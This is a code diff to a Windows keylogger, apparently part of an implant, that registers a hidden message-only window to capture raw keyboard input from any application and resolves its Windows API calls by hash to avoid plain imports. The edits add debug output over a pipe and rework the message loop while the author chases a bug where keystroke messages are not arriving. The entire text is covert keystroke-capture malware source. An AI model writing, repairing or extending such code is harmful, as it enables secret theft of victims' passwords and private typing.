@@ -59,7 +59,7 @@ auto DECLFN KeyloggerInstall(
 	teststr = "[+] Registered Window Class: \n";
     SafePipeWrite(teststr, Str::LengthA(teststr));
     
-	teststr = "[*] Creating Message-Only Window ...\n";
+	teststr = "[+] Creating Message-Only Window ...\n";
     SafePipeWrite(teststr, Str::LengthA(teststr));
 
     HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
@@ -84,7 +84,7 @@ auto DECLFN KeyloggerInstall(
 
     RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;     // Generic Desktop Controls
     RawDevice.usUsage     = HID_USAGE_GENERIC_KEYBOARD; // Keyboard
-    RawDevice.dwFlags     = RIDEV_INPUTSINK | RIDEV_NOLEGACY;            // Receive input even when not in focus
+    RawDevice.dwFlags     = RIDEV_INPUTSINK;            // Receive input even when not in focus
     RawDevice.hwndTarget  = WindowHandle;               // Our message-only window
 
     if (!Instance->Win32.RegisterRawInputDevices(&RawDevice, 1, sizeof(RAWINPUTDEVICE)))
@@ -98,11 +98,25 @@ auto DECLFN KeyloggerInstall(
 	teststr = "[+] Registered Raw Input Device\n";
 	SafePipeWrite(teststr, Str::LengthA(teststr));
 
+    teststr = "[+] Entering message loop...\n";
+    SafePipeWrite(teststr, Str::LengthA(teststr));
+
     MSG Msg = { 0 };
 
+    BOOL bRet = 0;
+
+    Instance->Win32.PostMessageW(WindowHandle, WM_USER, 0, 0);
     // enter the window message processing loop 
-    while (Instance->Win32.GetMessageW(&Msg, NULL, 0, 0))
+    while (( bRet = Instance->Win32.GetMessageW(&Msg, NULL, 0, 0)) != 0)
     {
+		SafePipeWrite("[+] Message received\n", 20);
+        if(bRet == -1)
+        {
+			SafePipeWrite("[!] GetMessageW failed\n", 22);
+            break;
+		}
+
+		SafePipeWrite("[+] Processing message\n", 23);
         Instance->Win32.TranslateMessage(&Msg);
         Instance->Win32.DispatchMessageW(&Msg);
     }
@@ -209,7 +223,6 @@ auto DECLFN CALLBACK WndCallback(
             return 0;
 
         case WM_INPUT:
-
             // this is not reaching in the code ????
 			SafePipeWrite("[+] WM_INPUT received\n", 21);
 
@@ -415,6 +428,7 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.RtlExitUserThread  = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
     Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
     
+	Instance->Win32.PostMessageW = (decltype(Instance->Win32.PostMessageW))LoadApi(User32, HashStr("PostMessageW"));
     Instance->Win32.RegisterClassExW = (decltype(Instance->Win32.RegisterClassExW))LoadApi(User32, HashStr("RegisterClassExW"));
     Instance->Win32.CreateWindowExW = (decltype(Instance->Win32.CreateWindowExW))LoadApi(User32, HashStr("CreateWindowExW"));
     Instance->Win32.RegisterRawInputDevices = (decltype(Instance->Win32.RegisterRawInputDevices))LoadApi(User32, HashStr("RegisterRawInputDevices"));
